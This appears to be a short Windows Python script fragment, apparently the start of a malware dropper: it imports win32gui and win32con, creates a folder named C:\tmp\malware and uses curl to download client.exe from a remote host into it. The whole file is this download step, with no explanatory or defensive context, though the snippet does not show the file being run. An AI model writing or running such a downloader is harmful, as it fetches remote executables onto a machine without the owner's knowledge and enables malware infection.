import win32gui, win32con
import os



os.popen('md "C:\\tmp\\malware"').read()
os.popen('(cd C:/tmp/malware && curl -O http://link/client.exe)').read()

